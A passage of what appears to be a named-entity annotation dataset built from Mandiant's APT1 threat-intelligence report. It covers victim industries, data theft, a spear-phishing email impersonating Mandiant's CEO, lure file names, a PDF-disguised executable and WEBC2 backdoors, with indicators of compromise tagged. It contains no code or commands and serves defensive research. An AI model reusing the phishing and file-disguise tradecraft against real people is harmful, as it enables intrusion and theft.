new victims operating in 10 different industries. Since we have seen that the group remains active in each victim’s 
network for an average of nearly a year after the initial date of compromise, we infer that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," committed these 17 
new breaches while simultaneously maintaining access to and continuing to steal data from a number of previously 
compromised victims.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 23 www.mandiant.com

",O
Mandiant_APT1_Report,Aerospace,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Chemicals,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Construction and Manufacturing,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Education,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Energy,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Engineering Services,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Financial Services,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Food and Agriculture,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Healthcare,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,High-Tech Electronics,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Information Technology,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Legal Services,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,"Media, Advertising and Entertainment",industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Metals and Mining,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Navigation,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Public Administration,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Satellites and Telecommunications,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Scientific Research and Consulting,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Transportation,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2006,timestamp
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2007,timestamp
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2008,timestamp
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2009,timestamp
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2010,timestamp
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2011,timestamp
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,2012,timestamp
Mandiant_APT1_Report,"

TIMELINE OF ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," COMPROMISES BY INDUSTRY SECTOR

International Organizations

FIGure 12: timeframe of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s cyber espionage operations against organizations by industry. the dots within 
each bar represent the earliest known date on which ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," compromised a new organization within the industry.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 24 www.mandiant.com

We believe that organizations in all industries related to ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,’s strategic priorities are potential targets of ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s 
comprehensive cyber espionage campaign. While we have certainly seen the group target some industries more  
heavily than others (see Figure 13), our observations confirm that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has targeted at least four of the seven  
strategic emerging industries that ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," identified in its 12th Five Year Plan.28 

0 5 10 15 20

0 5 10 15 20

",O
Mandiant_APT1_Report,Information Technology,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Aerospace,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Public Administration,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Satellites and Telecommunications,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Scientific Research and Consulting,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Energy,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Transportation,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Construction and Manufacturing,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Engineering Services,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,High-tech Electronics,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,International Organizations,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Legal Services,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,"Media, Advertising and Entertainment",industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Navigation,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Chemicals,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Financial Services,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Food and Agriculture,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Healthcare,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Metals and Mining,industry
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Education,industry
Mandiant_APT1_Report,"

Industries Compromised by ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"

FIGure 13: number of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," victims by industry. we determined each organization’s industry based on reviewing 
its industry classification in the hoover’s29 system. we also considered the content of the data that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," stole in 
each case, to the extent that this information was available.

28  ",O
Mandiant_APT1_Report,Joseph Casey,identity
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,Katherine Koleski,identity
Mandiant_APT1_Report,", Backgrounder: ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"’s 12th Five-Year Plan, ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report,-,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report, Economic & Security Review Commission (,O
Mandiant_APT1_Report,2011,timestamp
Mandiant_APT1_Report,"), 
19, http://www.uscc.gov/researchpapers/2011/12th-FiveYearPlan_062811.pdf, accessed ",O
Mandiant_APT1_Report,"February 3, 2013",timestamp
Mandiant_APT1_Report,".
29  http://www.hoovers.com/

http://www.uscc.gov/researchpapers/2011/12th-FiveYearPlan_062811.pdf


",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 25 www.mandiant.com

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," Data Theft

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," steals a broad range of information from its victims. The types of information the group has stolen relate to:

»» product development and use, including information on test results, system designs, product manuals, parts lists, 
and simulation technologies;

»» manufacturing procedures, such as descriptions of proprietary processes, standards, and waste management 
processes;

»» business plans, such as information on contract negotiation positions and product pricing, legal events, mergers, 
joint ventures, and acquisitions;

»» policy positions and analysis, such as white papers, and agendas and minutes from meetings involving high-
ranking personnel; 

»» emails of high-ranking employees; and

»» user credentials and network architecture information.

It is often difficult for us to estimate how much data ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has stolen during their intrusions for several reasons:

»» ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," deletes the compressed archives after they pilfer them, leaving solely trace evidence that is usually 
overwritten during normal business activities.

»» Pre-existing network security monitoring rarely records or identifies the data theft.

»» The duration of time between the data theft and ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,"’s investigation is often too great, and the trace evidence 
of data theft is overwritten during the normal course of business. 

»» Some victims are more intent on assigning resources to restore the security of their network in lieu of investigating 
and understanding the impact of the security breach.

Even with these challenges, we have observed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," steal as much as 6.5 terabytes of compressed data from a 
single organization over a ten-month time period. Given the scope of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s operations, including the number of 
organizations and industries we have seen them target, along with the volume of data they are clearly capable of 
stealing from any single organization, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has likely stolen hundreds of terabytes from its victims.

Largest ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," data theft 
from a single organization:

6.5 Terabytes

over 10 months

Although we do not have direct evidence indicating who receives the information 
that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," steals or how the recipient processes such a vast volume of data, we 
do believe that this stolen information can be used to obvious advantage by the 
PRC and Chinese state-owned enterprises. As an example, in ",O
Mandiant_APT1_Report,2008,timestamp
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
compromised the network of a company involved in a wholesale industry. ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
installed tools to create compressed file archives and to extract emails and 
attachments. ",O
Mandiant_APT1_Report,Over the following 2.5 years,timestamp
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," stole an unknown number of 
files from the victim and repeatedly accessed the email accounts of several 
executives, including the CEO and General Counsel. ",O
Mandiant_APT1_Report,During this same time period,timestamp
Mandiant_APT1_Report,", major news organizations reported that ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," had successfully 

negotiated a double-digit decrease in price per unit with the victim organization for one of its major commodities. This 
may be coincidental; however, it would be surprising if ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," could continue perpetrating such a broad mandate of 
cyber espionage and data theft if the results of the group’s efforts were not finding their way into the hands of entities 
able to capitalize on them. 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 26 www.mandiant.com

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," In The News

Public reporting corroborates and extends our observations of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s cyber espionage activity. However, several factors 
complicate the process of compiling and synthesizing public reports on ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". For one thing, information security 
researchers and journalists refer to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," by a variety of names. In addition, many cyber security analysts focus on 
writing about tools that are shared between multiple Chinese ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups without differentiating between the various 
actors that use them.

To assist researchers in identifying which public reports describe the threat group that we identify as ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,", Table 
3 provides a list of ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," group nicknames that frequently appear in the media and differentiates between those that 
describe ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," and those that do not. In addition, below is a list of public reports about Chinese threat actors that we 
have confirmed as referring to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,".

»» The earliest known public report about ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, infrastructure is a ,O
Mandiant_APT1_Report,2006,timestamp
Mandiant_APT1_Report," publication from the Japanese division of 
",O
Mandiant_APT1_Report,Symantec,org
Mandiant_APT1_Report,.30 The report calls out the hostname ,O
Mandiant_APT1_Report,sb.hugesoft.org,ioc
Mandiant_APT1_Report,", which is registered to an ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," persona known as 
",O
Mandiant_APT1_Report,Ugly Gorilla,identity
Mandiant_APT1_Report," (discussed later in this report).

»» In ",O
Mandiant_APT1_Report,September 2012,timestamp
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Brian Krebs,identity
Mandiant_APT1_Report, of the “Krebs on Security” cybercrime blog reported on a security breach at ,O
Mandiant_APT1_Report,Telvent Canada Ltd,org
Mandiant_APT1_Report, (now ,O
Mandiant_APT1_Report,Schneider Electric,org
Mandiant_APT1_Report,"), which we attributed to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," based on the tools and infrastructure 
that the hackers used to exploit and gain access to the system.31

taBLe 3: Identifying ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," nicknames in the news

nickname Verdict

",O
Mandiant_APT1_Report,Comment Crew,threat_actor
Mandiant_APT1_Report, Confirmed ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Comment Group,threat_actor
Mandiant_APT1_Report, Confirmed ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Shady Rat,threat_actor
Mandiant_APT1_Report, Possibly ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," (not confirmed)

",O
Mandiant_APT1_Report,nitro,threat_actor
Mandiant_APT1_Report, attacks Not ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,; Attributed to another tracked ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," group

",O
Mandiant_APT1_Report,elderwood,threat_actor
Mandiant_APT1_Report, Not ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,; Attributed to another tracked ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," group

",O
Mandiant_APT1_Report,sykipot,threat_actor
Mandiant_APT1_Report, Not ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,; Attributed to another tracked ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," group

",O
Mandiant_APT1_Report,aurora,threat_actor
Mandiant_APT1_Report, Not ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,; Attributed to another tracked ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," group

",O
Mandiant_APT1_Report,night Dragon,threat_actor
Mandiant_APT1_Report, Not ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,; Attributed to another tracked ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," group

»» A ",O
Mandiant_APT1_Report,SCADA,org
Mandiant_APT1_Report, security company by the name of ,O
Mandiant_APT1_Report,Digital Bond,org
Mandiant_APT1_Report," published a report of spear phishing against its company 
",O
Mandiant_APT1_Report,IN June 2012,timestamp
Mandiant_APT1_Report,".32 AlienVault provided analysis on the associated malware.33 Indicators included in the report have 
been attributed as part of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," infrastructure.

»» ",O
Mandiant_APT1_Report,In November 2012,timestamp
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Bloomberg,org
Mandiant_APT1_Report,’s ,O
Mandiant_APT1_Report,Chloe Whiteaker,identity
Mandiant_APT1_Report, authored a piece on a Chinese threat group called “,O
Mandiant_APT1_Report,Comment Group,threat_actor
Mandiant_APT1_Report,",” which described the various tools and domains used by ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, persona ,O
Mandiant_APT1_Report,Ugly Gorilla,identity
Mandiant_APT1_Report,".34

30  ",O
Mandiant_APT1_Report,Symantec,org
Mandiant_APT1_Report,", “Backdoor.Wualess,” ",O
Mandiant_APT1_Report,Symantec,org
Mandiant_APT1_Report, Security Response (,O
Mandiant_APT1_Report,2007,timestamp
Mandiant_APT1_Report,"), http://www.symantec.com/ja/jp/security_response/print_writeup.
jsp?docid=2006-101116-1723-99, accessed ",O
Mandiant_APT1_Report,"February 3, 2013",timestamp
Mandiant_APT1_Report,".
31  ",O
Mandiant_APT1_Report,Brian Krebs,identity
Mandiant_APT1_Report,", “Chinese Hackers Blamed for Intrusion at Energy Industry Giant Telvent,” Krebs on Security (",O
Mandiant_APT1_Report,2012,timestamp
Mandiant_APT1_Report,") http://krebsonsecurity.
com/2012/09/chinese-hackers-blamed-for-intrusion-at-energy-industry-giant-telvent/, accessed ",O
Mandiant_APT1_Report,"February 3, 2013",timestamp
Mandiant_APT1_Report,"
32 ",O
Mandiant_APT1_Report,Reid Wightman,identity
Mandiant_APT1_Report,", “Spear Phishing Attempt,” ",O
Mandiant_APT1_Report,Digital Bond,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,2012,timestamp
Mandiant_APT1_Report,"), https://www.digitalbond.com/blog/2012/06/07/spear-phishing-attempt/, accessed 
",O
Mandiant_APT1_Report,"February 3, 2013",timestamp
Mandiant_APT1_Report,".
33 ",O
Mandiant_APT1_Report,Jaime Blasco,identity
Mandiant_APT1_Report,", “Unveiling a spearphishing campaign and possible ramifications,” ",O
Mandiant_APT1_Report,Alien Vault,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,2012,timestamp
Mandiant_APT1_Report,"), http://labs.alienvault.com/labs/index.
php/2012/unveiling-a-spearphishing-campaign-and-possible-ramifications/, accessed ",O
Mandiant_APT1_Report,"February 3, 2013",timestamp
Mandiant_APT1_Report,".
34 ",O
Mandiant_APT1_Report,Chloe Whiteaker,identity
Mandiant_APT1_Report,", “Following the Hackers’ Trail,” ",O
Mandiant_APT1_Report,Bloomberg,org
Mandiant_APT1_Report,", (",O
Mandiant_APT1_Report,2012,timestamp
Mandiant_APT1_Report,") http://go.bloomberg.com/multimedia/following-hackers-trail/, accessed 
",O
Mandiant_APT1_Report,"February 3, 2013",timestamp
Mandiant_APT1_Report,".

http://www.symantec.com/ja/jp/security_response/print_writeup.jsp?docid=2006-101116-1723-99
http://www.symantec.com/ja/jp/security_response/print_writeup.jsp?docid=2006-101116-1723-99
http://krebsonsecurity.com/2012/09/chinese-hackers-blamed-for-intrusion-at-energy-industry-giant-telvent/
http://krebsonsecurity.com/2012/09/chinese-hackers-blamed-for-intrusion-at-energy-industry-giant-telvent/


",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 27 www.mandiant.com

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,": attaCk LIFeCyCLe

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has a well-defined attack methodology, honed over years and designed to steal massive quantities of intellectual 
property. They begin with aggressive spear phishing, proceed to deploy custom digital weapons, and end by exporting 
compressed bundles of files to ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," – before beginning the cycle again. They employ good English — with acceptable 
slang — in their socially engineered emails. They have evolved their digital weapons for more than seven years, 
resulting in continual upgrades as part of their own software release cycle. Their ability to adapt to their environment 
and spread across systems makes them effective in enterprise environments with trust relationships. 

These attacks fit into a cyclic pattern of activity that we will describe in this section within the framework of ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,"’s 
Attack Lifecycle model. In each stage we will discuss ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s specific techniques to illustrate their tenacity and the 
scale at which they operate. (See Appendix B: “APT and the Attack Lifecycle” for a high-level overview of the steps 
most ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups take in each stage of the Attack Lifecycle.)

Initial
Recon

Initial
Compromise

Establish
Foothold

Escalate
Privileges

Complete
Mission

Internal
Recon

Move
Laterally

Maintain
Presence

FIGure 14: ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,"’s attack Lifecycle Model



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 28 www.mandiant.com

The Initial Compromise

The Initial Compromise represents the methods intruders use to first penetrate a target organization’s network. As with 
most other ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," groups, spear phishing is ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s most commonly used technique. The spear phishing emails contain 
either a malicious attachment or a hyperlink to a malicious file. The subject line and the text in the email body are 
usually relevant to the recipient. ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," also creates webmail accounts using real peoples’ names — names that are 
familiar to the recipient, such as a colleague, a company executive, an IT department employee, or company counsel 
— and uses these accounts to send the emails. As a real-world example, this is an email that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, sent to ,O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," 
employees:

Date: ",O
Mandiant_APT1_Report,"Wed, 18 Apr 2012 06:31:41",timestamp
Mandiant_APT1_Report," -0700
From: ",O
Mandiant_APT1_Report,Kevin Mandia,identity
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,<,O
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,kevin.mandia@rocketmail.com,ioc
Mandiant_APT1_Report," >
Subject: Internal Discussion on the Press 
Release

Hello,
Shall we schedule a time to meet next week?
We need to finalize the press release.
Details click here.

",O
Mandiant_APT1_Report,Kevin Mandia,identity
Mandiant_APT1_Report,"

FIGure 15: ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," spear Phishing email 

At first glance, the email appeared to be from ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,"’s CEO, ",O
Mandiant_APT1_Report,Kevin Mandia,identity
Mandiant_APT1_Report,". However, further scrutiny shows that 
the email was not sent from a ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report," email account, but from “",O
Mandiant_APT1_Report,kevin.mandia@rocketmail.com,ioc
Mandiant_APT1_Report,”. ,ioc
Mandiant_APT1_Report,Rocketmail,software
Mandiant_APT1_Report," is a 
free webmail service. The account “",O
Mandiant_APT1_Report,kevin.mandia@rocketmail.com,ioc
Mandiant_APT1_Report,” does not belong to ,ioc
Mandiant_APT1_Report,Mr. Mandia,identity
Mandiant_APT1_Report,". Rather, an ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
actor likely signed up for the account specifically for this spear phishing event. If anyone had clicked on the link that 
day (which no one did, thankfully), their computer would have downloaded a malicious ZIP file named “",O
Mandiant_APT1_Report,Internal_Discussion_Press_Release_In_Next_Week8.zip,ioc
Mandiant_APT1_Report,”. This file contained a malicious executable that installs a custom ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
backdoor that we call ",O
Mandiant_APT1_Report,WEBC2-TABLE,malware
Mandiant_APT1_Report,".



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 29 www.mandiant.com

Although the files that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," actors attach or link to spear phishing emails are not always in ZIP format, this is the 
predominant trend we have observed in the last several years. Below is a sampling of file names that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has used 
with their malicious ZIP files:

",O
Mandiant_APT1_Report,2012ChinaUSAviationSymposium.zip,ioc
Mandiant_APT1_Report," 
",O
Mandiant_APT1_Report,Employee-Benefit-and-Overhead-Adjustment-Keys.zip,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,MARKET-COMMENT-Europe-Ends-Sharply-Lower-On-Data-Yields-Jump.zip,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,Negative_Reports_Of_Turkey.zip,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,New_Technology_For_FPGA_And_Its_Developing_Trend.zip,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,North_Korean_launch.zip,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,Oil-Field-Services-Analysis-And-Outlook.zip,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,POWER_GEN_2012.zip,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,Proactive_Investors_One2One_Energy_Investor_Forum.zip,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,Social-Security-Reform.zip,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,South_China_Sea_Security_Assessment_Report.zip,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,Telephonics_Supplier_Manual_v3.zip,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,The_Latest_Syria_Security_Assessment_Report.zip,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,Updated_Office_Contact_v1.zip,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,Updated_Office_Contact_v2.zip,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,Welfare_Reform_and_Benefits_Development_Plan.zip,ioc
Mandiant_APT1_Report,"

Spear Phishing Email
with Attachment

@

What’s this 
email?

Is this for real?

@

@
!“It’s legit.”

Okay, thanks!

",O
Mandiant_APT1_Report,APT 1,threat_actor
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,APT 1,threat_actor
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,APT 1,threat_actor
Mandiant_APT1_Report,"

The example file names include military, 
economic, and diplomatic themes, 
suggesting the wide range of industries that 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," targets. Some names are also generic 
(e.g., “",O
Mandiant_APT1_Report,updated_office_contact_v1.zip,ioc
Mandiant_APT1_Report,"”) and 
could be used for targets in any industry.

On some occasions, unsuspecting email 
recipients have replied to the spear 
phishing messages, believing they were 
communicating with their acquaintances. 
In one case a person replied, “I’m not sure 
if this is legit, so I didn’t open it.” Within 20 
minutes, someone in ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," responded with 
a terse email back: “It’s legit.” 

 

FIGure 16: ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s interaction with a spear phishing recipient



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 30 www.mandiant.com

would you click on this?

Some ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," actors have gone to the trouble of making the malicious software inside their ZIP files look 
like benign ",O
Mandiant_APT1_Report,Adobe,org
Mandiant_APT1_Report," PDF files. Here is an example:

This is not a PDF file. It looks like the filename has a PDF extension but the file name actually includes 
119 spaces after “.pdf” followed by “.exe” — the real file extension. ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," even went to the trouble of 
turning the executable’s icon to an ",O
Mandiant_APT1_Report,Adobe,org
Mandiant_APT1_Report," symbol to complete the ruse. However, this file is actually a 
dropper for a custom ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, backdoor that we call ,O
Mandiant_APT1_Report,WEBC2-QBP,malware
Mandiant_APT1_Report,". 

Establishing A Foothold

Establishing a foothold involves actions that ensure control of the target network’s systems from outside the network. 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," establishes a foothold once email recipients open a malicious file and a backdoor is subsequently installed. A 
backdoor is software that allows an intruder to send commands to the system remotely. In almost every case, ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," 
backdoors initiate outbound connections to the intruder’s “command and control” (C2) server. ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," intruders employ 
this tactic because while network firewalls are generally adept at keeping malware outside the network from initiating 
communication with systems inside the network, they are less reliable at keeping malware that is already inside the 
network from communicating to systems outside. 

1001100100011010100                     10010100101110001100100011010100                     
C2

FIGure 17: Backdoors installed on compromised systems usually initiate connections with C2 servers

While ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, intruders occasionally use publicly available backdoors such as ,O
Mandiant_APT1_Report,Poison Ivy,malware
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,Gh0st RAT,malware
Mandiant_APT1_Report,", the vast 
majority of the time they use what appear to be their own custom backdoors. We have documented 42 families of 
backdoors in “Appendix C: The Malware Arsenal” that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," uses that we believe are not publicly available. In addition 
we have provided 1,007 MD5 hashes associated with ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, malware in Appendix E. We will describe ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s backdoors 
in two categories: “",O
Mandiant_APT1_Report,Beachhead Backdoors,malware
Mandiant_APT1_Report,” and “,O
Mandiant_APT1_Report,Standard Backdoors,malware
Mandiant_APT1_Report,".”



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 31 www.mandiant.com

",O
Mandiant_APT1_Report,Beachhead Backdoors,malware
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Beachhead Backdoors,malware
Mandiant_APT1_Report," are typically minimally 
featured. They offer the attacker a toe-hold to 
perform simple tasks like retrieve files, gather 
basic system information and trigger the 
execution of other more significant capabilities 
such as a standard backdoor.

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,’s ,O
Mandiant_APT1_Report,Beachhead Backdoors,malware
Mandiant_APT1_Report," are usually 
what we call ",O
Mandiant_APT1_Report,WEBC2,malware
Mandiant_APT1_Report, backdoors. ,O
